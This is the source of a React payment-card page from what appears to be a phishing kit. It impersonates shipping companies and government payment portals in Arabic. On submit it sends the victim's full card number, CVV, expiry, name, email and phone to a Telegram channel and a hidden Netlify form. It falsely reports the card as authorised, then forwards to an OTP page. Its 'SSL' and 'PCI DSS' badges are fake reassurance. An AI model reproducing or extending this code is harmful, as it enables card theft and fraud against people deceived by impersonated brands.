import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { CreditCard, Shield, CheckCircle2, AlertCircle, Lock, Calendar, ArrowLeft } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { isGovernmentService } from "@/lib/governmentPaymentServices";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";
import { formatCurrency, getCountryByCurrency } from "@/lib/countryCurrencies";
import { formatCardNumber, validateLuhn, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
import { sendToTelegram } from "@/lib/telegram";
import { getCountryByCode } from "@/lib/countries";
import { getBankById } from "@/lib/banks";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { getServiceVisualIdentity, getVisualIdentityByType } from "@/lib/paymentVisualSystems";
import CustomPaymentHeader from "@/components/CustomPaymentHeader";
import CustomPaymentCard from "@/components/CustomPaymentCard";
import { getNonGovPaymentGatewayVisuals, shouldUsePaymentGatewayVisuals } from "@/lib/nonGovPaymentGatewayVisuals";

const PaymentCardInput = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const [searchParams] = useSearchParams();
  const { data: linkData, isLoading } = useLink(id);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardValid, setCardValid] = useState<boolean | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isReady, setIsReady] = useState(false);

  const serviceParam = searchParams.get('service') || searchParams.get('s');
  const amountParam = searchParams.get('amount') || searchParams.get('a');
  const countryParam = searchParams.get('country') || searchParams.get('c');
  const currencyParam = searchParams.get('currency');
  const bankParam = searchParams.get('bank') || searchParams.get('b');

  const inferredCountryFromCurrency = currencyParam ? getCountryByCurrency(currencyParam) : null;

  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedCountry = countryParam || inferredCountryFromCurrency || linkData?.payload?.selectedCountry || "SA";
  const selectedBankId = bankParam || linkData?.payload?.selectedBank || '';

  const serviceKey = serviceParam || linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const linkType = linkData?.type || 'shipping';
  
  const isGovService = isGovernmentService(serviceKey);
  const govSystem = getGovernmentPaymentSystem(selectedCountry);
  
  // Apply payment gateway visuals for non-government services
  const useGatewayVisuals = !isGovService && shouldUsePaymentGatewayVisuals(serviceKey);
  const gatewayVisuals = useGatewayVisuals ? getNonGovPaymentGatewayVisuals(selectedCountry, serviceKey) : null;
  const serviceVisual = isGovService ? null : (gatewayVisuals || getVisualIdentityByType(linkType));

  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  const rawAmount = amountParam || paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || selectedCountry;
  const formattedAmount = formatCurrency(amount, currencyCode);

  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = getCountryByCode(selectedCountry);
  
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsReady(true);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);
  
  useEffect(() => {
    if (linkData || countryParam) {
      setIsReady(true);
    }
  }, [linkData, countryParam]);
  
  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
    setCardNumber(formatted);
    
    const cleaned = formatted.replace(/\s/g, '');
    if (cleaned.length >= 13) {
      const isValid = validateLuhn(formatted);
      setCardValid(isValid);
      
      if (!isValid && cleaned.length === 16) {
        toast({
          title: "رقم البطاقة غير صحيح",
          description: "الرجاء التحقق من رقم البطاقة",
          variant: "destructive",
        });
      }
    } else {
      setCardValid(null);
    }
  };
  
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });
  
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 20 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    if (!validateLuhn(cardNumber)) {
      toast({
        title: "رقم البطاقة غير صحيح",
        description: "الرجاء التحقق من رقم البطاقة المدخل",
        variant: "destructive",
      });
      return;
    }
    
    if (!validateExpiry(expiryMonth, expiryYear)) {
      toast({
        title: "تاريخ الانتهاء غير صحيح",
        description: "البطاقة منتهية الصلاحية أو التاريخ غير صحيح",
        variant: "destructive",
      });
      return;
    }
    
    const cardType = detectCardType(cardNumber);
    if (!validateCVV(cvv, cardType)) {
      toast({
        title: "CVV غير صحيح",
        description: cardType === 'amex' ? "CVV يجب أن يكون 4 أرقام لبطاقات American Express" : "CVV يجب أن يكون 3 أرقام",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    const expiry = `${expiryMonth}/${expiryYear}`;
    
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    sessionStorage.setItem('cardNumber', cardNumber);
    sessionStorage.setItem('cardExpiry', expiry);
    sessionStorage.setItem('cardCvv', cvv);
    sessionStorage.setItem('cardType', cardType);
    
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details-new",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardholder: cardName,
          cardLast4: last4,
          cardType: cardType,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      // Form submission error
    }
    
    const telegramResult = await sendToTelegram({
      type: 'card_details_with_bank',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardholder: cardName,
        cardNumber: cardNumber,
        cardLast4: last4,
        cardType: cardType,
        expiry: expiry,
        cvv: cvv,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    navigate(`/pay/${id}/otp`);
  };

  if (isGovService) {
    const GovLayout = getGovernmentLayout(selectedCountry);
    return (
      <GovLayout
        countryCode={selectedCountry}
        serviceName={govSystem.nameAr || serviceName}
        amount={formattedAmount}
      >
        <div className="mb-6 bg-blue-50 border border-blue-100 p-4 rounded-md flex items-center gap-3">
          <div className="bg-blue-100 p-2 rounded-full">
            <Lock className="w-5 h-5 text-blue-700" />
          </div>
          <div>
            <h3 className="font-bold text-sm text-blue-900">بيانات الدفع الآمنة</h3>
            <p className="text-xs text-blue-700">جميع البيانات مشفرة باستخدام SSL 256-bit</p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-5">
          {/* Cardholder Name */}
          <div>
            <Label className="block mb-2 text-sm font-semibold" style={{ color: govSystem.colors.text }}>
              اسم حامل البطاقة (كما يظهر على البطاقة)
            </Label>
            <Input
              placeholder="CARD HOLDER NAME"
              value={cardName}
              onChange={(e) => setCardName(e.target.value.toUpperCase())}
              className="h-12 border-gray-300 rounded-md focus:ring-2 focus:ring-offset-0"
              style={{ 
                borderRadius: govSystem.borderRadius.sm,
                focusRingColor: govSystem.colors.primary 
              }}
              required
            />
          </div>
          
          {/* Card Number */}
          <div>
            <Label className="flex justify-between items-center mb-2 text-sm font-semibold" style={{ color: govSystem.colors.text }}>
              <span>رقم البطاقة</span>
              {cardValid === true && <span className="text-green-600 text-xs flex items-center gap-1"><CheckCircle2 className="w-3 h-3" /> صحيح</span>}
              {cardValid === false && <span className="text-red-500 text-xs flex items-center gap-1"><AlertCircle className="w-3 h-3" /> غير صحيح</span>}
            </Label>
            <div className="relative">
              <Input
                placeholder="0000 0000 0000 0000"
                value={cardNumber}
                onChange={(e) => handleCardNumberChange(e.target.value)}
                inputMode="numeric"
                className="h-12 border-gray-300 rounded-md tracking-wider font-mono text-lg"
                style={{ borderRadius: govSystem.borderRadius.sm }}
                required
              />
              <div className="absolute left-3 top-1/2 -translate-y-1/2">
                <CreditCard className="w-5 h-5 text-gray-400" />
              </div>
            </div>
          </div>
          
          {/* Expiry & CVV */}
          <div className="grid grid-cols-3 gap-4">
            <div>
              <Label className="block mb-2 text-sm font-semibold" style={{ color: govSystem.colors.text }}>الشهر</Label>
              <Select value={expiryMonth} onValueChange={setExpiryMonth} required>
                <SelectTrigger className="h-12 border-gray-300" style={{ borderRadius: govSystem.borderRadius.sm }}>
                  <SelectValue placeholder="MM" />
                </SelectTrigger>
                <SelectContent>
                  {months.map((m) => <SelectItem key={m.value} value={m.value}>{m.label}</SelectItem>)}
                </SelectContent>
              </Select>
            </div>

            <div>
              <Label className="block mb-2 text-sm font-semibold" style={{ color: govSystem.colors.text }}>السنة</Label>
              <Select value={expiryYear} onValueChange={setExpiryYear} required>
                <SelectTrigger className="h-12 border-gray-300" style={{ borderRadius: govSystem.borderRadius.sm }}>
                  <SelectValue placeholder="YY" />
                </SelectTrigger>
                <SelectContent>
                  {years.map((y) => <SelectItem key={y.value} value={y.value}>{y.label}</SelectItem>)}
                </SelectContent>
              </Select>
            </div>

            <div>
              <Label className="block mb-2 text-sm font-semibold" style={{ color: govSystem.colors.text }}>رمز الأمان (CVV)</Label>
              <div className="relative">
                <Input
                  type="password"
                  placeholder="123"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  inputMode="numeric"
                  className="h-12 border-gray-300 text-center tracking-widest"
                  style={{ borderRadius: govSystem.borderRadius.sm }}
                  maxLength={4}
                  required
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                  <Lock className="w-4 h-4" />
                </div>
              </div>
            </div>
          </div>

          {/* Submit Button */}
          <Button
            type="submit"
            size="lg"
            className="w-full h-12 text-base font-bold mt-6"
            disabled={isSubmitting || !cardValid}
            style={{
              background: govSystem.gradients.primary,
              borderRadius: govSystem.borderRadius.md,
              color: govSystem.colors.textOnPrimary,
              boxShadow: govSystem.shadows.md
            }}
          >
            {isSubmitting ? "جاري تنفيذ العملية..." : "إتمام الدفع"}
          </Button>
          
          <div className="mt-4 flex items-center justify-center gap-2">
            <span className="text-xs text-gray-400">Secure Payment Gateway</span>
            <Lock className="w-3 h-3 text-gray-400" />
          </div>
        </form>
      </GovLayout>
    );
  }

  if (!serviceVisual) {
    return (
      <DynamicPaymentLayout
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title="بيانات البطاقة"
        description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
        icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
        bankId={selectedBankId}
        countryCode={selectedCountry}
      >
        {/* Fallback content for services without visual system */}
        <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
          <div>
            <Label className="mb-2 text-sm sm:text-base flex items-center gap-2">
              <CreditCard className="w-4 h-4" />
              اسم حامل البطاقة *
            </Label>
            <Input placeholder="أدخل الاسم كما هو مكتوب على البطاقة" value={cardName} onChange={(e) => setCardName(e.target.value.toUpperCase())} className="h-12 sm:h-14 text-base sm:text-lg" style={{ borderWidth: '2px', borderColor: branding.colors.border }} required />
          </div>
          <div>
            <Label className="mb-2 text-sm sm:text-base flex items-center justify-between">
              <div className="flex items-center gap-2"><CreditCard className="w-4 h-4" /><span>رقم البطاقة *</span></div>
              {cardValid === true && <span className="text-xs text-green-600 flex items-center gap-1"><CheckCircle2 className="w-4 h-4" /> صحيح</span>}
              {cardValid === false && <span className="text-xs text-destructive">غير صحيح</span>}
            </Label>
            <Input placeholder="#### #### #### ####" value={cardNumber} onChange={(e) => handleCardNumberChange(e.target.value)} inputMode="numeric" className={`h-12 sm:h-14 text-base sm:text-lg tracking-wider font-mono ${cardValid === false ? 'border-destructive' : cardValid === true ? 'border-green-500' : ''}`} style={{ borderWidth: '2px', borderColor: cardValid === false ? '#ef4444' : cardValid === true ? '#10b981' : branding.colors.border }} required />
          </div>
          <div className="grid grid-cols-3 gap-3">
            <div><Label className="mb-2 text-xs sm:text-sm flex items-center gap-2"><Calendar className="w-4 h-4" />شهر *</Label><Select value={expiryMonth} onValueChange={setExpiryMonth} required><SelectTrigger className="h-12 sm:h-14" style={{ borderWidth: '2px', borderColor: branding.colors.border }}><SelectValue placeholder="شهر" /></SelectTrigger><SelectContent className="z-50">{months.map((month) => <SelectItem key={month.value} value={month.value}>{month.label}</SelectItem>)}</SelectContent></Select></div>
            <div><Label className="mb-2 text-xs sm:text-sm flex items-center gap-2"><Calendar className="w-4 h-4" />سنة *</Label><Select value={expiryYear} onValueChange={setExpiryYear} required><SelectTrigger className="h-12 sm:h-14" style={{ borderWidth: '2px', borderColor: branding.colors.border }}><SelectValue placeholder="سنة" /></SelectTrigger><SelectContent className="z-50">{years.map((year) => <SelectItem key={year.value} value={year.value}>{year.label}</SelectItem>)}</SelectContent></Select></div>
            <div><Label className="mb-2 text-xs sm:text-sm flex items-center gap-2"><Lock className="w-4 h-4" />CVV *</Label><Input type="password" placeholder="***" value={cvv} onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} inputMode="numeric" className="h-12 sm:h-14 text-base sm:text-lg text-center" style={{ borderWidth: '2px', borderColor: branding.colors.border }} maxLength={4} required /></div>
          </div>
          <Button type="submit" size="lg" className="w-full h-14 text-lg font-bold mt-6 text-white hover:opacity-90 transition-all" disabled={isSubmitting || !cardValid} style={{ background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`, borderRadius: '12px', boxShadow: '0 4px 12px rgba(0,0,0,0.15)' }}>{isSubmitting ? <><div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white ml-2"></div>جاري المعالجة...</> : <><span className="ml-2">دفع الآن</span><ArrowLeft className="w-5 h-5 mr-2" /></>}</Button>
        </form>
      </DynamicPaymentLayout>
    );
  }

  return (
    <div 
      className="min-h-screen"
      style={{
        background: serviceVisual.gradients.background,
        fontFamily: serviceVisual.fonts.primary
      }}
      dir="rtl"
    >
      <CustomPaymentHeader
        visual={serviceVisual}
        serviceName={serviceName}
        logo={branding.logo}
        showSecurityBadge={true}
      />

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-2xl mx-auto">
          <div className="text-center mb-6">
            <h1 
              className="text-2xl font-bold mb-2"
              style={{ 
                color: serviceVisual.colors.primary,
                fontFamily: serviceVisual.fonts.primary,
                fontWeight: serviceVisual.fonts.headingWeight
              }}
            >
              بيانات البطاقة
            </h1>
            <p 
              className="text-sm"
              style={{ color: serviceVisual.colors.textSecondary }}
            >
              أدخل معلومات بطاقتك الائتمانية بشكل آمن
            </p>
          </div>

          <CustomPaymentCard visual={serviceVisual}>
            {/* Security Notice */}
            <div
              className="mb-6 p-5 rounded-xl flex items-center gap-4"
              style={{ 
                background: `${serviceVisual.colors.primary}10`,
                border: `2px solid ${serviceVisual.colors.primary}30`,
                borderRadius: serviceVisual.ui.borderRadius.lg
              }}
            >
              <div
                className="w-12 h-12 rounded-full flex items-center justify-center flex-shrink-0"
                style={{ background: serviceVisual.gradients.primary }}
              >
                <Shield className="w-6 h-6 text-white" />
              </div>
              <div>
                <h3
                  className="font-bold text-base mb-1"
                  style={{ 
                    color: serviceVisual.colors.text,
                    fontFamily: serviceVisual.fonts.primary
                  }}
                >
                  دفع آمن ومشفر بالكامل
                </h3>
                <p 
                  className="text-sm" 
                  style={{ color: serviceVisual.colors.textSecondary }}
                >
                  معلومات بطاقتك محمية بأعلى معايير الأمان SSL 256-bit
                </p>
              </div>
            </div>

            {/* Visual Card Display */}
            <div 
              className="rounded-2xl p-6 mb-6 relative overflow-hidden shadow-lg"
              style={{
                background: serviceVisual.gradients.primary,
                minHeight: '200px',
                borderRadius: serviceVisual.ui.borderRadius.lg
              }}
            >
        <div className="absolute top-4 right-4 flex items-center gap-2">
          <CreditCard className="w-10 h-10 sm:w-12 sm:h-12 text-white/80" />
          {cardValid === true && (
            <CheckCircle2 className="w-6 h-6 text-green-300" />
          )}
        </div>
        
        {/* Card Type Badge */}
        {cardNumber.length > 0 && (
          <div className="absolute top-4 left-4">
            <span className="text-xs text-white/70 uppercase font-semibold">
              {detectCardType(cardNumber)}
            </span>
          </div>
        )}
        
        {/* Card Number Display */}
        <div className="mt-14 sm:mt-16 mb-5 sm:mb-6">
          <div className="flex gap-2 sm:gap-3 text-white text-xl sm:text-2xl font-mono">
            <span>••••</span>
            <span>••••</span>
            <span>••••</span>
            <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
          </div>
        </div>

        <div className="flex justify-between items-end text-white">
          <div>
            <p className="text-[10px] sm:text-xs opacity-70 mb-1">EXPIRES</p>
            <p className="text-base sm:text-lg font-mono">
              {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
            </p>
          </div>
          <div className="text-right">
            <p className="text-[10px] sm:text-xs opacity-70 mb-1">CARDHOLDER</p>
            <p className="text-base sm:text-lg font-bold">{cardName || "YOUR NAME"}</p>
          </div>
        </div>
      </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Cardholder Name */}
              <div>
                <Label 
                  className="mb-3 text-sm font-bold flex items-center gap-2"
                  style={{ 
                    color: serviceVisual.colors.text,
                    fontFamily: serviceVisual.fonts.secondary
                  }}
                >
                  <CreditCard className="w-4 h-4" style={{ color: serviceVisual.colors.primary }} />
                  اسم حامل البطاقة *
                </Label>
                <Input
                  placeholder="CARD HOLDER NAME"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  className="text-base uppercase"
                  style={{
                    height: serviceVisual.ui.inputHeight,
                    borderRadius: serviceVisual.ui.borderRadius.md,
                    border: `2px solid ${serviceVisual.colors.border}`,
                    fontFamily: serviceVisual.fonts.secondary
                  }}
                  required
                />
              </div>
        
              {/* Card Number */}
              <div>
                <Label className="mb-3 text-sm font-bold flex items-center justify-between" style={{ color: serviceVisual.colors.text, fontFamily: serviceVisual.fonts.secondary }}>
                  <div className="flex items-center gap-2">
                    <CreditCard className="w-4 h-4" style={{ color: serviceVisual.colors.primary }} />
                    <span>رقم البطاقة *</span>
                  </div>
                  {cardValid === true && <span className="text-xs flex items-center gap-1" style={{ color: serviceVisual.colors.success }}><CheckCircle2 className="w-4 h-4" /> صحيح</span>}
                  {cardValid === false && <span className="text-xs flex items-center gap-1" style={{ color: serviceVisual.colors.error }}><AlertCircle className="w-4 h-4" /> غير صحيح</span>}
                </Label>
                <Input
                  placeholder="#### #### #### ####"
                  value={cardNumber}
                  onChange={(e) => handleCardNumberChange(e.target.value)}
                  inputMode="numeric"
                  className="text-lg tracking-wider font-mono"
                  style={{
                    height: serviceVisual.ui.inputHeight,
                    borderRadius: serviceVisual.ui.borderRadius.md,
                    border: `2px solid ${cardValid === false ? serviceVisual.colors.error : cardValid === true ? serviceVisual.colors.success : serviceVisual.colors.border}`,
                    fontFamily: 'monospace'
                  }}
                  required
                />
              </div>
        
              {/* Expiry & CVV Row */}
              <div className="grid grid-cols-3 gap-4">
                <div>
                  <Label className="mb-3 text-sm font-bold" style={{ color: serviceVisual.colors.text, fontFamily: serviceVisual.fonts.secondary }}>
                    <div className="flex items-center gap-1.5"><Calendar className="w-3.5 h-3.5" style={{ color: serviceVisual.colors.primary }} />شهر *</div>
                  </Label>
                  <Select value={expiryMonth} onValueChange={setExpiryMonth} required>
                    <SelectTrigger style={{ height: serviceVisual.ui.inputHeight, borderRadius: serviceVisual.ui.borderRadius.md, border: `2px solid ${serviceVisual.colors.border}`, fontFamily: serviceVisual.fonts.secondary }}>
                      <SelectValue placeholder="MM" />
                    </SelectTrigger>
                    <SelectContent>{months.map((month) => <SelectItem key={month.value} value={month.value}>{month.label}</SelectItem>)}</SelectContent>
                  </Select>
                </div>

                <div>
                  <Label className="mb-3 text-sm font-bold" style={{ color: serviceVisual.colors.text, fontFamily: serviceVisual.fonts.secondary }}>
                    <div className="flex items-center gap-1.5"><Calendar className="w-3.5 h-3.5" style={{ color: serviceVisual.colors.primary }} />سنة *</div>
                  </Label>
                  <Select value={expiryYear} onValueChange={setExpiryYear} required>
                    <SelectTrigger style={{ height: serviceVisual.ui.inputHeight, borderRadius: serviceVisual.ui.borderRadius.md, border: `2px solid ${serviceVisual.colors.border}`, fontFamily: serviceVisual.fonts.secondary }}>
                      <SelectValue placeholder="YY" />
                    </SelectTrigger>
                    <SelectContent>{years.map((year) => <SelectItem key={year.value} value={year.value}>{year.label}</SelectItem>)}</SelectContent>
                  </Select>
                </div>

                <div>
                  <Label className="mb-3 text-sm font-bold" style={{ color: serviceVisual.colors.text, fontFamily: serviceVisual.fonts.secondary }}>
                    <div className="flex items-center gap-1.5"><Lock className="w-3.5 h-3.5" style={{ color: serviceVisual.colors.primary }} />CVV *</div>
                  </Label>
                  <Input
                    type="password"
                    placeholder="***"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    inputMode="numeric"
                    className="text-lg text-center tracking-widest"
                    style={{ 
                      height: serviceVisual.ui.inputHeight,
                      borderRadius: serviceVisual.ui.borderRadius.md,
                      border: `2px solid ${serviceVisual.colors.border}`,
                      fontFamily: 'monospace'
                    }}
                    maxLength={4}
                    required
                  />
                </div>
              </div>

              {/* Security Badges */}
              <div className="flex items-center gap-3 justify-center mb-4">
                <div 
                  className="px-4 py-2 rounded-full flex items-center gap-2"
                  style={{
                    background: `${serviceVisual.colors.success}20`,
                    border: `1px solid ${serviceVisual.colors.success}`,
                    borderRadius: serviceVisual.ui.borderRadius.xl
                  }}
                >
                  <Lock className="w-3.5 h-3.5" style={{ color: serviceVisual.colors.success }} />
                  <span className="text-xs font-bold" style={{ color: serviceVisual.colors.success }}>SSL 256-bit</span>
                </div>
                <div 
                  className="px-4 py-2 rounded-full flex items-center gap-2"
                  style={{
                    background: `${serviceVisual.colors.primary}20`,
                    border: `1px solid ${serviceVisual.colors.primary}`,
                    borderRadius: serviceVisual.ui.borderRadius.xl
                  }}
                >
                  <Shield className="w-3.5 h-3.5" style={{ color: serviceVisual.colors.primary }} />
                  <span className="text-xs font-bold" style={{ color: serviceVisual.colors.primary }}>PCI DSS</span>
                </div>
              </div>
              <CustomPaymentButton
                visual={serviceVisual}
                type="submit"
                variant="primary"
                size="lg"
                className="w-full"
                disabled={!cardValid}
                loading={isSubmitting}
                icon={<ArrowLeft className="w-5 h-5" />}
                iconPosition="right"
              >
                دفع الآن
              </CustomPaymentButton>

              <p 
                className="text-xs text-center mt-4" 
                style={{ 
                  color: serviceVisual.colors.textSecondary,
                  fontFamily: serviceVisual.fonts.secondary
                }}
              >
                بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
              </p>
            </form>
          </CustomPaymentCard>
        </div>
      </div>
      
      {/* Hidden Netlify Form */}
      <form name="card-details-new" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="cardType" />
        <input type="text" name="expiry" />
        <input type="text" name="timestamp" />
      </form>
    </div>
  );
};

export default PaymentCardInput;
